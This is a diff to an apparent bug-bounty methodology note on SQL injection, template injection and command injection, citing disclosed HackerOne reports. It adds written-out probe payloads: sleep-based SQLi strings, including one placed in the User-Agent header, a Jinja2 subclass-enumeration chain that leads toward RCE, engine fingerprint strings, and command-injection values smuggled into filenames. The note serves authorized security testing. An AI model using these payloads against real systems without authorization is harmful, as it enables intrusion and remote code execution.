@@ -9,7 +9,7 @@ the highest tier a program offers. Drawn from disclosed HackerOne reports.
 | Pattern | Disclosed example | Detail |
 |---|---|---|
 | **Blind/time-based via unexpected param** | Mail.ru (H1 #732430) | Blind SQLi via an insecurely-used GET parameter on a news page — not an obvious "search" field. |
-| **Injection via HTTP header, not a form field** | GSA/data.gov (H1 #297478) | SQLi confirmed via sleep-based payloads in the **User-Agent header** — always test headers (User-Agent, Referer, X-Forwarded-For), not just visible inputs. |
+| **Injection via HTTP header, not a form field** | GSA/data.gov (H1 #297478, Critical 9.1) | SQLi confirmed via sleep-based payloads in the **`User-Agent` header** against `/dashboard/datagov/csv_to_json`, without extracting any real data — always test headers (User-Agent, Referer, X-Forwarded-For), not just visible inputs. **Exact technique:** arithmetic-conditional sleep payloads of the form `' OR IF(<condition>, SLEEP(5), 0)-- -` sent as the `User-Agent` value; varying `<condition>` and timing the response confirmed boolean-blind extraction was possible without ever touching real data (kept the PoC minimal/non-destructive, which is part of why it was accepted quickly). |
 | **Time-based blind on DoD assets** | DoD (H1 #2759243, #313037, #2597543) | Recurring pattern: response-time manipulation via `SLEEP()`/`WAITFOR DELAY`-style payloads confirms injection even with no visible error or data returned. |
 | **Injection in a secondary/forgotten subdomain** | Automattic/Atavist docs subdomain (H1 #1039315) | Found on `docs.atavist.com` — a documentation or secondary subdomain, not the main app. Don't skip "minor" subdomains during recon. |
 
@@ -26,7 +26,7 @@ it, and it often goes straight to remote code execution.
 
 | Pattern | Disclosed example | Detail |
 |---|---|---|
-| **Jinja2 (Flask) SSTI → RCE** | Uber (H1 #125980, $10,000) | Classic `{{7*7}}`-style probe confirmed Jinja2 template injection, escalated to full RCE. Still one of the highest-value single-bug categories when found. |
+| **Jinja2 (Flask) SSTI → RCE** | Uber (H1 #125980, $10,000, by Orange Tsai) | Injected into a **profile-name field** on `rider.uber.com`; the app rendered it server-side into an email notification (support@uber.com), proving template execution without ever touching the live page. Still one of the highest-value single-bug categories when found. **Exact payload chain used:**<br>1. Confirm execution (in a field expected to just store text): `{{ '7'*7 }}` → notification email showed `7777777` instead of the literal string — proves Jinja2 is evaluating the input as a template, not just storing it.<br>2. Enumerate reachable Python classes from the sandboxed template context: `{{ [].__class__.__base__.__subclasses__() }}`<br>3. Walk MRO to find a class with OS access (e.g. subprocess-related): `{{ ''.__class__.mro()[1].__subclasses__() }}`<br>4. Loop construct to exfiltrate output since raw `{{ }}` blocks can be filtered: `{% for c in [1,2,3] %}{{c,c,c}}{% endfor %}` (shows loop/iteration still executes even if direct expression output is blocked). |
 | **Smarty template SSTI → RCE** | Unikrn (H1 #164224) | Same pattern, different template engine — test engine-specific syntax once you suspect templating (Smarty uses `{$smarty.version}` style probes). |
 | **Handlebars SSTI → RCE** | Shopify (H1 #423541) | Handlebars is normally considered "logicless" and SSTI-resistant — this report shows that assumption can still fail depending on how it's invoked server-side. Don't skip testing an engine just because it's marketed as safe. |
 | **EJS via view-rendering plugin** | Fastify (H1 #3122019) | `@fastify/view` + EJS allowed arbitrary EJS execution → RCE when an attacker could control raw content passed to the renderer — look for any feature where user input reaches a template-rendering call, even indirectly (e.g. via a plugin/middleware layer). |
@@ -51,3 +51,39 @@ it, and it often goes straight to remote code execution.
 2. Test filenames and file content for command-injection characters (`; `, `|`, `` ` ``, `$()`) if the app might pass them to a shell command.
 3. For Java backends: check if user input (including odd places like User-Agent, X-Forwarded-For) ends up in a logged string that could trigger JNDI lookup-style injection.
 4. Always confirm with the least invasive proof possible (`sleep`, `id`, a harmless file write to a location you can verify) — full RCE findings carry legal and ethical weight; never pivot beyond what's needed to prove the vulnerability, and never touch data beyond what's required for the PoC.
+
+## Quick-reference payload cheatsheet
+Non-destructive confirmation payloads only — use these to *prove* a class
+of bug exists, then stop (don't escalate further than needed to
+demonstrate impact on an authorized target).
+
+**SQLi confirmation (try in any suspect param or header):**
+```
+'
+' OR '1'='1
+' OR SLEEP(5)-- -
+' OR IF(1=1, SLEEP(5), 0)-- -
+"; WAITFOR DELAY '0:0:5'--     -- (MSSQL)
+' AND 1=CONVERT(int, @@version)-- -   -- (MSSQL error-based)
+```
+
+**SSTI engine-fingerprinting (try each, see which evaluates):**
+```
+{{7*7}}            -- Jinja2 (Flask), Twig -> 49 if vulnerable
+${7*7}              -- FreeMarker, some others
+<%= 7*7 %>          -- ERB (Ruby), EJS
+#{7*7}               -- Ruby/Slim
+*{7*7}                -- Thymeleaf
+{$smarty.version}     -- Smarty fingerprint
+```
+Once confirmed, escalate with the engine-specific chain (see Jinja2
+example above) or use `tplmap` to automate fingerprint + exploit.
+
+**Command injection confirmation (filenames, file content, any field that might reach a shell):**
+```
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+```
+
